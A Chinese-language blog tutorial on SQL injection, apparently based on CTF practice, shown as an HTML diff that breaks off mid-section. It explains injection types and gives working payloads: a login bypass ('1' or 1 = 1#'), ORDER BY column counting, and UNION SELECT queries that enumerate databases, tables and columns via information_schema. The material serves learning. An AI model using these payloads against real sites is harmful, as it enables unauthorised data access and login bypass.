@@ -1,0 +1,1075 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
+  <title>
+    SQL注入漏洞 | Cl1ck-t0&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="SQL注入漏洞  一.前置  1.sql注入的概述和原理 SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入漏洞">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2025/12/29/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
+<meta property="og:description" content="SQL注入漏洞  一.前置  1.sql注入的概述和原理 SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s41.ax1x.com/2026/07/27/pmR7zsf.png">
+<meta property="article:published_time" content="2025-12-29T07:00:34.000Z">
+<meta property="article:modified_time" content="2026-08-11T02:14:25.062Z">
+<meta property="article:author" content="Cl1ck-t0">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="web漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s41.ax1x.com/2026/07/27/pmR7zsf.png">
+    <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+      <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" integrity="sha384-tLMkTWh2pfXNWGFlUS0w1TFtRG5xZ9lPWFOooj+vDDLIL+xBGQU/voDBY5XE2lVh" crossorigin="anonymous">
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <span class="main-nav-link">Friend</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/atom.xml">
+          <span class="main-nav-link">rss</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="SQL注入漏洞">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">SQL注入漏洞</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+      <meting-js
+        theme="var(--color-link)"
+        id="6868625065"
+        server="netease"
+        type="playlist"
+        
+        
+        autoplay="false"
+        loop="all"
+        order="list"
+        
+        volume="0.7"
+        mutex="true"
+        
+        
+      ></meting-js>
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%89%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text"> 一.前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1sql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%A6%82%E8%BF%B0%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.sql注入的概述和原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%89%8D%E7%BD%AE"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.sql注入基础前置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%9F%BA%E6%9C%AC%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.1.2.1.</span> <span class="toc-text"> 1）基本查询语句：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2information_schema"><span class="toc-number">1.1.2.2.</span> <span class="toc-text"> 2）information_schema：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3limit"><span class="toc-number">1.1.2.3.</span> <span class="toc-text"> 3）limit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">1.1.2.4.</span> <span class="toc-text"> 4）注释符：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%AF%B9%E4%BA%8Esql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.</span> <span class="toc-text"> 二.对于SQL注入漏洞的挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%8F%AF%E8%83%BD%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.可能的注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2.漏洞检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text"> 三.常见的注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.搜索型注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text"> 四.联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96%E6%8F%92%E4%B8%80%E5%98%B4%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text"> 二)编插一嘴：报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E6%94%AF%E6%8C%81"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 原理支持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%BC%96%E6%8F%92%E4%B8%80%E5%98%B4%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text"> 三)编插一嘴：堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9A%E4%B9%89"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 1.定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 2. 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 3.基本语句</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.</span> <span class="toc-text"> 五.盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 1.布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 2.时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.</span> <span class="toc-text"> 六.延时注入</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-SQL注入基础" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2025-12-29T07:00:34.000Z" itemprop="datePublished">2025-12-29</time>
+    <time style="display: none;" id="post-update-time">2026-08-11</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="sql注入漏洞"><a class="markdownIt-Anchor" href="#sql注入漏洞"></a> SQL注入漏洞</h1>
+<h2 id="一前置"><a class="markdownIt-Anchor" href="#一前置"></a> 一.前置</h2>
+<h3 id="1sql注入的概述和原理"><a class="markdownIt-Anchor" href="#1sql注入的概述和原理"></a> 1.sql注入的概述和原理</h3>
+<p>SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是<strong>web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询</strong>，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言）</p>
+<p><strong>注入产生的原因是后台服务器在接收相关参数时未做好过滤直接带入到数据库中查询，导致可以拼接执行构造的SQL语句</strong></p>
+<p><em>SQL注入漏洞的本质为数据库层面的RCE</em></p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">SELECT</span> \<span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $_GET [ <span class="string">&#x27;id&#x27;</span> ]<span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>比如这里的参数 id 是可控的，还是带入了数据库查询，所以非法用户可以任意拼接SQL语句来进行攻击。</p>
+<h3 id="2sql注入基础前置"><a class="markdownIt-Anchor" href="#2sql注入基础前置"></a> 2.sql注入基础前置</h3>
+<h4 id="1基本查询语句"><a class="markdownIt-Anchor" href="#1基本查询语句"></a> 1）基本查询语句：</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;select  column_name  from  tables_name </span><br><span class="line"> 在表tables_name中查询字段column_name</span><br><span class="line">&gt;select  column_name  from  tables_name  where  已知字段名=已知的条件</span><br><span class="line">     在已知的条件下，在表tables_name中查询字段column_name</span><br></pre></td></tr></table></figure>
+<h4 id="2information_schema"><a class="markdownIt-Anchor" href="#2information_schema"></a> 2）information_schema：</h4>
+<p>MySQL的默认数据库，其中schemata/tables/columns这三个表比较重要，关系如下图：</p>
+<p><img src="https://s41.ax1x.com/2026/07/27/pmR7zsf.png" alt="image" /></p>
+<h4 id="3limit"><a class="markdownIt-Anchor" href="#3limit"></a> 3）limit</h4>
+<p>limit子句是用于限制查询结果返回的数量，常用于分页查询。也就是SQL查询出来的结果集，按照升序排列，有小到大排列。</p>
+<p>语法：limit m，n</p>
+<p>参数：m：是指记录开始的位置，从0开始，表示第一条记录</p>
+<p>n：是指取n条记录</p>
+<h4 id="4注释符"><a class="markdownIt-Anchor" href="#4注释符"></a> 4）注释符：</h4>
+<p>在MySQL中，常见注释符的表达方式：</p>
+<p><code># ......：#号后面的都会被注释</code></p>
+<p><code>-- ......：--号后面的都会被注释，不过在 -- 的前后都需要加空格再加数据</code></p>
+<p><code>/* ... */：内联注释，内联注释可以用于整个SQL语句中，用来执行SQL语句。</code></p>
+<p>这里详细说明一下：</p>
+<p>在HTTP请求中，<strong>空格</strong>（``）是一个特殊字符，在URL里要么被浏览器/服务器忽略，要么被截断，要么被自动编码成 <code>%20</code>。</p>
+<p><strong>但传输过程中，这个空格很可能被服务器或Web容器（如Tomcat、Apache）自动过滤掉</strong>。</p>
+<p>因为<code>--</code>后面没有空格，注释没生效，后面的单引号<code>'</code>没有闭合，导致SQL语法错误。</p>
+<p>所以我们很多情况下都会将+代替空格，在URL编码规则中，<strong><code>+</code> 在查询字符串（Query String）里会被服务器解码为空格</strong>。</p>
+<h2 id="二对于sql注入漏洞的挖掘"><a class="markdownIt-Anchor" href="#二对于sql注入漏洞的挖掘"></a> 二.对于SQL注入漏洞的挖掘</h2>
+<p>由于现代浏览器比较完善，几乎不可能存在sql注入点（），因此以下所述均为做题中的体会（纯入门心得，有点问题请见谅doge）</p>
+<h3 id="1可能的注入点"><a class="markdownIt-Anchor" href="#1可能的注入点"></a> 1.可能的注入点</h3>
+<p>1). 搜索框，登录界面等，这些地方肯定是与数据库有数据交互的，所以我们可以优先观察存在传值或者查询的地方。</p>
+<p>eg.buuctf 极客大挑战2019 EasySQL</p>
+<p>2). 当没有明显搜索框等明显交互位置时，并不代表不存在sql漏洞，这时可以通过url进行传参。</p>
+<p>eg.buuctf 极客大挑战2019 loveSQL &amp;&amp;Knife(后者虽然通常使用蚁剑来秒杀但是也可以用HackBar当成SQL做同样很快)</p>
+<h3 id="2漏洞检测"><a class="markdownIt-Anchor" href="#2漏洞检测"></a> 2.漏洞检测</h3>
+<p>1.get型</p>
+<p>进行url编码</p>
+<p>如果是在burp中测试payload需要先进行url编码，浏览器中则不需要;</p>
+<p>不进行编码的话，也可以用+代替空格，#代替–+ 。 <mark>%23代表#</mark>，也是注释符。</p>
+<p>2.post型</p>
+<p>如果是post型的话，我们可以用上面的方法进行编码，或者使用+代替空格，也可以不使用，直接像在浏览器中探测一样。</p>
+<h2 id="三常见的注入手法"><a class="markdownIt-Anchor" href="#三常见的注入手法"></a> 三.常见的注入手法</h2>
+<p>首先我们应该判断知道其注入类型，SQL注入按照注入点类型分类可分为三种：</p>
+<h3 id="1数字型注入"><a class="markdownIt-Anchor" href="#1数字型注入"></a> 1.数字型注入</h3>
+<p>SQL中的语句格式：select * from users where id =x</p>
+<pre><code>    判断方法：使用 1 and 1=1  ，1 and 1=2 来判断
+
+    当输入：and 1=1 时页面显示正常
+
+                   select * from users where id =x and 1=1
+
+        输入：and 1=2 时页面显示异常
+
+                   select * from users where id =x and 1=2
+
+       说明是数字型注入
+</code></pre>
+<h3 id="2字符型注入"><a class="markdownIt-Anchor" href="#2字符型注入"></a> 2.字符型注入</h3>
+<p>SQL中的语句格式：select * from users where id =‘x’</p>
+<pre><code>    判断方法：使用 1' and '1'='1  ，1' and '1'='2 来判断
+
+    当输入：1’ and ‘1’='1 时页面显示正常
+
+                   select * from users where id ='x' and '1'='1'
+
+       输入：1’ and ‘1’='2 时页面显示异常
+
+                  select * from users where id ='x' and '1'='2'
+
+      说明是字符型注入
+</code></pre>
+<h3 id="3搜索型注入"><a class="markdownIt-Anchor" href="#3搜索型注入"></a> 3.搜索型注入</h3>
+<p>基于搜索框的注入</p>
+<pre><code>    SQL中的语句格式：select * from database.table where users like '%要查询的关键字%'
+
+   判断方法：
+
+     某个商品名称%' and 1=1 and '%'='  （这个语句的功能就相当于普通SQL注入的 and 1=1）
+</code></pre>
+<p>select * from database.table where users like ‘%某个商品名称%’ and 1=1 and ‘%’=‘%’</p>
+<pre><code>    页面显示正常
+
+     某个商品名称%' and 1=2 and '%'='  （这个语句的功能就相当于普通SQL注入的 and 1=2）
+</code></pre>
+<p>select * from database.table where users like ‘%某个商品名称%’ and 1=2 and ‘%’=‘%’</p>
+<pre><code>    页面显示异常
+
+    根据上面的返回情况来判断是否存在搜索型注入
+</code></pre>
+<h2 id="四联合注入"><a class="markdownIt-Anchor" href="#四联合注入"></a> 四.联合注入</h2>
+<p>联合注入是一种非常常用的注入方式，union select 开头的语句属于联合注入，联合注入的必要条件就是页面必须要有回显位，否则就应该考虑使用盲注（后面再展开说明）</p>
+<p>这里我将总结部分比较常用的SQL注入语句：</p>
+<p>首先我们先明确SQL注入的基本流程，在基础的SQL操作中通常有这样的尝试顺序：</p>
+<p>1.先判断SQL注入类型；</p>
+<p>2.判断闭合方式，查询字段，判断回显位；</p>
+<p>3.爆库，爆表，爆列，爆内容。</p>
+<p>另外，页面可能存在过滤，有时要综合考虑各种绕过方法，例如双写绕过，编码绕过等。</p>
+<p>1).查找注入点</p>
+<p><strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1 = 1#  </span><br></pre></td></tr></table></figure>
+<p>#可以用–+替换，有些情境#不能起作用QAQ</p>
+<p>(这条万能语句常用于<strong>登录框</strong>之类的注入)</p>
+<p><strong>作用：<strong>是爆出表中的</strong>所有字段</strong></p>
+<p><strong>举例</strong>：验证用户名和密码的语句</p>
+<p>我们在这里做出简单的解释：</p>
+<p>页面原sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where username=&#x27;$name&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+<p>在进行上述语句后变为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where username=&#x27;1&#x27; or 1 = 1#&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+<p>#是注释符号，后面的内容被注释，or为或，两边一边为真就是真，由于右边1=1为真，故为真；</p>
+<p>因此上述语句就等价于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27; or 1 = 1</span><br></pre></td></tr></table></figure>
+<p>2).查询字段数</p>
+<p><strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 数值--+</span><br></pre></td></tr></table></figure>
+<p>3).判断回显位</p>
+<p><strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1’ union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<p>在上一步的查询字段数后我们知道了字段数，接着就根据字段数来判断，若之前找到的字段数为二，事例语句就应该改为</p>
+<p>union select 1,2–+</p>
+<p>4).爆破数据库名</p>
+<p><strong>关键</strong>：<strong>database()</strong></p>
+<p>​    根据回显位，在回显位输入所要内容对应的关键字。（例如回显位是 2，下面为事例）</p>
+<p><strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database(),3--+   </span><br></pre></td></tr></table></figure>
+<p>5).爆破表格名</p>
+<p>关键：</p>
+<p><strong>group_concat(table_name) from information_schema.tables where table_schema=database()</strong></p>
+<p><strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>
+<p>简单注释一下：</p>
+<ul>
+<li>
+<p><strong>1</strong>：第一个占位列，保持列数匹配</p>
+</li>
+<li>
+<p><strong>group_concat(table_name)</strong>：核心攻击代码</p>
+<ul>
+<li><code>group_concat()</code>：MySQL函数，将多行合并为一行</li>
+<li><code>table_name</code>：从information_schema.tables获取表名</li>
+</ul>
+</li>
+<li>
+<p><strong>3</strong>：第三个占位列</p>
+<ul>
+<li>
+<p><strong>information_schema</strong>：MySQL的系统数据库</p>
+</li>
+<li>
+<p><strong>tables</strong>：存储所有数据库表信息的元数据表</p>
+<p><code>where table_schema=database()</code></p>
+<ul>
+<li><strong>table_schema</strong>：筛选当前数据库</li>
+<li><strong>database()</strong>：返回当前数据库名的函数</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>由上述事例可以看出，和爆破数据库名一样的思路,都是在回显位输入所要内容对应的关键字。</p>
+<p>【注意：如果 information_schema 被过滤了，可以使用 sys】（QAQ没用过，本人也不懂emmmmmm）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&amp;&amp;substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),1,1)=&#x27;f&#x27;</span><br></pre></td></tr></table></figure>
+<p>6).爆破表格字段</p>
+<p>关键：</p>
+<p><strong>group_concat(column_name) from information_schema.columns where table_name=‘表格名’</strong></p>
+<p><strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表格名&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>7).获取字段值</p>
+<p>关键：</p>
+<p><strong>group_concat(id,username,password) from geekuser</strong></p>
+<p><strong>语句：</strong></p>
